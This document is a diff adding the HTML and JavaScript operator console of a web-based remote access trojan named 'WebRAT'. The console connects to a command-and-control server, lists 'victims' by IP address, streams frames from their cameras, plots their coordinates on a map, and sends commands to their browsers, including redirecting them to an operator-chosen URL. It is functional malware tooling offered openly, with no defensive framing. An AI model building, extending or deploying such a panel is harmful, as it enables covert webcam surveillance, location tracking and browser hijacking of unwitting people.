@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebRAT Surveillance Dashboard</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0d0d0d;
+            color: #00ff41;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            text-transform: uppercase;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+        }
+
+        .container {
+            display: flex;
+            gap: 20px;
+        }
+
+        .sidebar {
+            width: 300px;
+            border-right: 1px solid #333;
+            padding-right: 20px;
+        }
+
+        .main-view {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .victim-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .victim-item {
+            padding: 10px;
+            border: 1px solid #333;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .victim-item:hover {
+            background: #1a1a1a;
+            border-color: #00ff41;
+        }
+
+        .stream-container {
+            position: relative;
+            width: 100%;
+            max-width: 900px;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+        }
+
+        #video-feed {
+            width: 100%;
+            aspect-ratio: 16/9;
+            display: block;
+            object-fit: contain;
+        }
+
+        .live-badge {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: #ff0000;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 2px 10px rgba(255, 0, 0, 0.4);
+            z-index: 10;
+        }
+
+        .live-badge::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .stream-info {
+            background: #1a1a1a;
+            padding: 15px 20px;
+            border-top: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-pill {
+            background: rgba(0, 255, 65, 0.1);
+            color: #00ff41;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            width: 100%;
+            max-width: 900px;
+        }
+
+        button {
+            background: #252525;
+            color: #fff;
+            border: 1px solid #333;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button:hover {
+            background: #333;
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+
+        button.primary {
+            background: #cc0000;
+            border-color: #cc0000;
+        }
+
+        button.primary:hover {
+            background: #ff0000;
+            border-color: #ff0000;
+            color: white;
+        }
+
+        .log-panel {
+            margin-top: 0;
+            /* Adjusted from original */
+            width: 100%;
+            height: 150px;
+            overflow-y: auto;
+            border: 1px solid #333;
+            padding: 10px;
+            font-size: 12px;
+            border-radius: 8px;
+            /* Added */
+            max-width: 900px;
+            /* Added */
+        }
+
+        .log-entry {
+            margin-bottom: 5px;
+            border-bottom: 1px solid #111;
+        }
+    </style>
+</head>
+
+<body>
+    <h1><span style="color: #ff0000;">●</span> WebRAT Control Room</h1>
+    <div class="container">
+        <div class="sidebar">
+            <h3>Online Targets</h3>
+            <ul class="victim-list" id="victim-list">
+                <li class="victim-item" id="no-victims">Scanning for signals...</li>
+            </ul>
+        </div>
+        <div class="main-view">
+            <div class="stream-container">
+                <div class="live-badge">LIVE</div>
+                <img id="video-feed" src="" alt="NO SIGNAL">
+                <div class="stream-info">
+                    <div>
+                        <span id="target-id-display" style="font-weight: bold;">SELECT A TARGET</span>
+                        <div id="target-meta" style="font-size: 11px; color: #888; margin-top: 4px;">No active session
+                        </div>
+                    </div>
+                    <div class="status-pill" id="latency-display">Latency: --ms</div>
+                </div>
+            </div>
+
+            <div class="controls">
+                <button class="primary" onclick="sendCommand('snapshot')">
+                    CAPTURE FRAME
+                </button>
+                <button onclick="sendCommand('alert')">SEND MESSAGE</button>
+                <button onclick="sendCommand('reload')">SYSTEM RESET</button>
+                <button onclick="sendCommand('redirect')">RELOCATE</button>
+            </div>
+
+            <div id="victim-info"
+                style="background: #111; padding: 15px; border-radius: 8px; border: 1px solid #333; font-size: 13px; width: 100%; max-width: 900px;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <div>IP ADDR: <span id="target-ip" style="color: #00ff41;">--</span></div>
+                    <div>COORDS: <span id="target-location" style="color: #00ff41;">--</span></div>
+                </div>
+            </div>
+
+            <div class="log-panel" id="logs">
+                <div class="log-entry" style="color: #888;">[SYSTEM] Ready for uplink.</div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script>
+        const socket = io({
+            query: { type: 'surveillance' },
+            transports: ['polling', 'websocket']
+        });
+
+        socket.on('connect_error', (err) => {
+            log(`Connection Error: ${err.message}. Try disabling Brave Shields.`);
+        });
+        let currentTarget = null;
+        let victims = new Map();
+        let lastFrameTime = Date.now();
+        const logPanel = document.getElementById('logs');
+        const videoFeed = document.getElementById('video-feed');
+        const victimList = document.getElementById('victim-list');
+        const noVictimsMsg = document.getElementById('no-victims');
+
+        function log(msg) {
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span style="color: #444;">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            logPanel.prepend(entry);
+        }
+
+        socket.on('video_frame', (data) => {
+            if (!victims.has(data.sid)) addVictim(data.sid, 'Unknown');
+            if (!currentTarget) selectTarget(data.sid);
+            if (data.sid === currentTarget) {
+                videoFeed.src = data.data;
+                const now = Date.now();
+                const latency = now - lastFrameTime;
+                document.getElementById('latency-display').innerText = `Latency: ${latency}ms`;
+                lastFrameTime = now;
+            }
+        });
+
+        socket.on('connect', () => {
+            log('Link established with C2 Server');
+            socket.emit('force_sync');
+        });
+
+        socket.on('victim_list_sync', (list) => {
+            list.forEach(v => addVictim(v.sid, v.ip));
+        });
+
+        socket.on('victim_connected', (data) => {
+            log(`NEW CONNECTION: ${data.sid} (${data.ip || 'Unknown'})`);
+            addVictim(data.sid, data.ip);
+        });
+
+        socket.on('victim_disconnected', (data) => {
+            log(`SIGNAL LOST: ${data.sid}`);
+            removeVictim(data.sid);
+        });
+
+        socket.on('surveillance_snapshot', (data) => {
+            if (!victims.has(data.sid)) addVictim(data.sid, 'Unknown');
+            log(`Snapshot received from ${data.sid.substring(0, 6)}`);
+        });
+
+        socket.on('location_update', (data) => {
+            const sid = data.sid;
+            const loc = data.data;
+            if (!victims.has(sid)) addVictim(sid, loc.ip || 'Unknown');
+
+            if (victims.has(sid)) {
+                const v = victims.get(sid);
+                v.location = loc;
+                if (loc.ip && (v.ip === 'Unknown' || !v.ip)) {
+                    v.ip = loc.ip;
+                    const el = document.getElementById(`v-${sid}`);
+                    if (el) el.querySelector('div:last-child').innerText = loc.ip;
+                }
+            }
+
+            if (sid === currentTarget) {
+                const locStr = `${loc.lat.toFixed(4)}, ${loc.lon.toFixed(4)}`;
+                document.getElementById('target-location').innerHTML = `
+                    <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank" style="color: #00ff41;">${locStr}</a>`;
+                if (loc.ip) document.getElementById('target-ip').innerText = loc.ip;
+            }
+        });
+
+        socket.on('log_update', (data) => log(`[REMOTE]: ${data.msg}`));
+
+        function selectTarget(sid) {
+            currentTarget = sid;
+            const data = victims.get(sid) || { ip: 'Unknown', sid };
+            document.getElementById('target-id-display').innerText = `TARGET: ${sid.substring(0, 8).toUpperCase()}`;
+            document.getElementById('target-ip').innerText = data.ip;
+            document.getElementById('target-meta').innerText = `CONNECTED FROM ${data.ip} | PROTOCOL: WS-ENCRYPTED`;
+
+            document.querySelectorAll('.victim-item').forEach(el => {
+                el.style.borderColor = '#333';
+                el.style.background = 'transparent';
+            });
+            const active = document.getElementById(`v-${sid}`);
+            if (active) {
+                active.style.borderColor = '#00ff41';
+                active.style.background = 'rgba(0, 255, 65, 0.05)';
+            }
+            log(`Uplink established with ${sid.substring(0, 6)}`);
+        }
+
+        function addVictim(sid, ip) {
+            if (victims.has(sid)) return;
+            victims.set(sid, { ip, sid });
+            if (noVictimsMsg) noVictimsMsg.style.display = 'none';
+            const li = document.createElement('li');
+            li.className = 'victim-item';
+            li.id = `v-${sid}`;
+            li.innerHTML = `<div style="font-weight: bold;">NODE ${sid.substring(0, 6).toUpperCase()}</div><div style="font-size: 10px; color: #666;">${ip}</div>`;
+            li.onclick = () => selectTarget(sid);
+            victimList.appendChild(li);
+            if (!currentTarget) selectTarget(sid);
+        }
+
+        function removeVictim(sid) {
+            victims.delete(sid);
+            const el = document.getElementById(`v-${sid}`);
+            if (el) el.remove();
+            if (currentTarget === sid) {
+                currentTarget = null;
+                videoFeed.src = '';
+                document.getElementById('target-id-display').innerText = 'SIGNAL LOST';
+                document.getElementById('latency-display').innerText = 'Latency: --ms';
+            }
+            if (victims.size === 0 && noVictimsMsg) noVictimsMsg.style.display = 'block';
+        }
+
+        function sendCommand(type) {
+            if (!currentTarget) return log('Error: No target selected');
+            let payload = { type, command: type, target_sid: currentTarget };
+            if (type === 'alert') payload.msg = prompt("Enter alert message:");
+            if (type === 'redirect') payload.url = prompt("Enter redirect URL:");
+            if (payload.msg === null || payload.url === null) return;
+            socket.emit('remote_command', payload);
+            log(`Command dispatched: ${type.toUpperCase()}`);
+        }
+    </script>
+</body>
+
+</html>
